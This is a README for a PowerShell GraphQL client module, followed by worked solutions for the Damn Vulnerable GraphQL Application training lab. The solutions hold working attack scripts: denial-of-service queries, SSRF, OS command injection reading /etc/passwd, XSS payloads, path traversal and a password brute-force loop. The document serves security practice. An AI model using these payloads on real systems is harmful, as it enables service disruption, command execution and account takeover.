# PSGraphQL
This PowerShell module contains functions that facilitate querying and create, update, and delete (mutations) operations for GraphQL endpoints.

## Examples

### Send a GraphQL query to an endpoint with the results returned as objects

```powershell
$url = "https://mytargetserver/v1/graphql"

$myQuery = '
query {
  users {
    created_at
    id
    last_seen
    name
  }
}
'
$requestHeaders = @{ myApiKey="aoMGY{+93dx&t!5)VMu4pI8U8T.ULO" }

Invoke-GraphQLQuery -Query $myQuery -Headers $requestHeaders -Uri $url
```

### Send a GraphQL mutation to an endpoint with the results returned as JSON

```powershell
$url = "https://mytargetserver/v1/graphql"

$myMutation = '
    mutation MyMutation {
        insert_users_one(object: {id: "57", name: "FirstName LastName"}) {
        id
    }
}
'

$requestHeaders = @{ myApiKey="aoMGY{+93dx&t!5)VMu4pI8U8T.ULO" }

$jsonResult = Invoke-GraphQLQuery -Mutation $myMutation -Headers $requestHeaders -Uri $url -Raw
```

# Damn Vulnerable GraphQL Application Solutions

The "Damn Vulnerable GraphQL Application" is an intentionally vulnerable implementation of the GraphQL technology that allows a tester to learn and practice GraphQL Security. For more on DVGQL, please see: https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application

The solutions below are written in PowerShell exclusively but two of the solutions required Invoke-WebRequest as opposed to this modules Invoke-GraphQLQuery.

```powershell
# GraphQL endpoint for all solutions below:
$gqlEndpointUri = "https://mygraphqlserver.company.com/graphql"
```

## Denial of Service :: Batch Query Attack

```powershell
# Generate 100 queries:
$amountOfQueries = 100
$jsonEntry = '{"query":"query {\n  systemUpdate\n}","variables":[]}'
$jsonObjects = (1..$amountOfQueries | ForEach-Object { $jsonEntry }) -join ","
$batchQueryAttackPayload = "[" + $jsonObjects + "]"

Invoke-WebRequest -Uri $gqlEndpointUri -Method Post -Body $batchQueryAttackPayload -ContentType "application/json" | Select -Expand Content
```

## Denial of Service :: Deep Recursion Query Attack
```powershell

$depthAttackQuery = '
query {
      pastes {
        owner {
          paste {
            edges {
              node {
                  owner {
                    paste {
                      edges {
                        node {
                          owner {
                            paste {
                              edges {
                                node {
                                  owner {
                                    id
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
'

Invoke-GraphQLQuery -Query $depthAttackQuery -Uri $gqlEndpointUri -Raw

```


## Denial of Service :: Resource Intensive Query Attack
```powershell
$timingTestPayload = '
    query TimingTest {
      systemUpdate
    }
'

$start = Get-Date

Invoke-GraphQLQuery -Query $timingTestPayload -Uri $gqlEndpointUri -Raw

$end = Get-Date

$delta = $end - $start
$totalSeconds = $delta.Seconds
$message = "Total seconds to execute query: {0}" -f $totalSeconds

Write-Host -Object $message -ForegroundColor Cyan

```

## Information Disclosure :: GraphQL Introspection
```powershell
$introspectionQuery = '
  query {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
      }
    }
'

Invoke-GraphQLQuery -Query $introspectionQuery -Uri $gqlEndpointUri -Raw

```


## Information Disclosure :: GraphQL Interface
```powershell

$graphiqlUri = "{0}/graphiql" -f $targetUri

$headers = @{Accept="text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"}

Invoke-WebRequest -Uri $graphiqlUri -Headers $headers -Method Get -UseBasicParsing | Select -ExpandProperty Content

```


## Information Disclosure :: GraphQL Field Suggestions
```powershell
$fieldSuggestionsQuery = '
    query {
        systemUpdate
    }
'

Invoke-GraphQLQuery -Query $fieldSuggestionsQuery -Uri $gqlEndpointUri -Raw

```


## Information Disclosure :: Server Side Request Forgery
```powershell
$requestForgeryMutation = '
mutation {
    importPaste(host:"localhost", port:57130, path:"/", scheme:"http") {
      result
    }
}
'

Invoke-GraphQLQuery -Mutation $requestForgeryMutation -Uri $gqlEndpointUri -Raw

```


## Code Execution :: OS Command Injection #1
```powershell
$commandToInject = "ls -alr"

$commandInjectionMutation = '
mutation  {
      importPaste(host:"localhost", port:80, path:"/ ; ' + $commandToInject + '", scheme:"http"){
        result
      }
    }
'

$result = Invoke-GraphQLQuery -Mutation $commandInjectionMutation -Uri $gqlEndpointUri

Write-Host -Object $result.data.importPaste.result -ForegroundColor Magenta
```


## Code Execution :: OS Command Injection #2
```powershell
# Admin creds for DVGQL:
$userName = "admin"
$password = "password"

$commandInjectionQuery = '
    query {
        systemDiagnostics(username:"' + $userName + '" password:"' + $password + '", cmd:"id; ls -l")
    }
'

Invoke-GraphQLQuery -Query $commandInjectionQuery -Uri $gqlEndpointUri -Raw

```

## Code Execution :: OS Command Injection #3
```powershell
# Admin creds for DVGQL:
$userName = "admin"
$password = "password"

$command = "cat /etc/passwd"

$commandInjectionQuery = '
    query {
        systemDiagnostics(username:"' + $userName + '" password:"' + $password + '", cmd:"' + $command + '")
    }
'

Invoke-GraphQLQuery -Query $commandInjectionQuery -Uri $gqlEndpointUri -Raw
```

## Injection :: Stored Cross Site Scripting
```powershell
$xssInjectionMutation = '
    mutation XcssMutation {
        uploadPaste(content: "<script>alert(1)</script>", filename: "C:\\temp\\file.txt") {
            content
            filename
            result
        }
    }
'

Invoke-GraphQLQuery -Mutation $xssInjectionMutation -Uri $gqlEndpointUri -Raw

```


## Injection :: Log Injection
```powershell
$logInjectionMutation = '
    mutation getPaste{
        createPaste(title:"<script>alert(1)</script>", content:"zzzz", public:true) {
                burn
                content
                public
                title
            }
    }
'

Invoke-GraphQLQuery -Mutation $logInjectionMutation -Uri $gqlEndpointUri

```


## Injection :: HTML Injection
```powershell
$htmlInjectionMutation = '
    mutation myHtmlInjectionMutation {
        createPaste(title:"<h1>hello!</h1>", content:"zzzz", public:true) {
            burn
            content
            public
            title
        }
    }
'

Invoke-GraphQLQuery -Mutation $htmlInjectionMutation -Uri $gqlEndpointUri -Raw

```


## Authorization Bypass :: GraphQL Interface Protection Bypass
```powershell
$reconQuery = '
   query IntrospectionQuery {
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    subscriptionType {
      name
    }
  }
}
'

$session = [Microsoft.PowerShell.Commands.WebRequestSession]::new()
$cookie = [System.Net.Cookie]::new()
$cookie.Name = "env"
# $cookie.Value = "Z3JhcGhpcWw6ZGlzYWJsZQ" # This is base64 for graphiql:disable
$cookie.Value = "Z3JhcGhpcWw6ZW5hYmxl" # This is base64 for graphiql:enable
$cookie.Domain = $targetHost
$session.Cookies.Add($cookie)

Invoke-GraphQLQuery -Query $reconQuery -Uri $gqlEndpointUri -WebSession $session -Raw

```


## GraphQL Query Deny List Bypass
```powershell
$bypassQuery = '
    query BypassMe {
      systemHealth
    }
'

$headers= @{'X-DVGA-MODE'='Expert'}

Invoke-GraphQLQuery -Query $bypassQuery -Uri $gqlEndpointUri -Headers $headers -Raw

```


## Miscellaneous :: Arbitrary File Write // Path Traversal
```powershell
$pathTraversalMutation = '
    mutation PathTraversalMutation {
            uploadPaste(filename:"../../../../../tmp/file.txt", content:"path traversal test"){
            result
        }
    }
'

Invoke-GraphQLQuery -Mutation $pathTraversalMutation -Uri $gqlEndpointUri -Raw

```


## Miscellaneous :: GraphQL Query Weak Password Protection
```powershell
$passwordList = @('admin123', 'pass123', 'adminadmin', '123', 'password', 'changeme', 'password54321', 'letmein', 'admin123', 'iloveyou', '00000000')

$command = "ls"

foreach ($pw in $passwordList)
{
    $bruteForceAuthQuery = '
        query bruteForceQuery {
          systemDiagnostics(username: "admin", password: "' + $pw + '", cmd: "' + $command + '")
        }
    '

    $result = Invoke-GraphQLQuery -Query $bruteForceAuthQuery -Uri $gqlEndpointUri

    if ($result.data.systemDiagnostics -ne "Password Incorrect") {
        Write-Host -Object $("The password is: ") -ForegroundColor Yellow -NoNewline
        Write-Host -Object $pw -ForegroundColor Green
    }
}
```
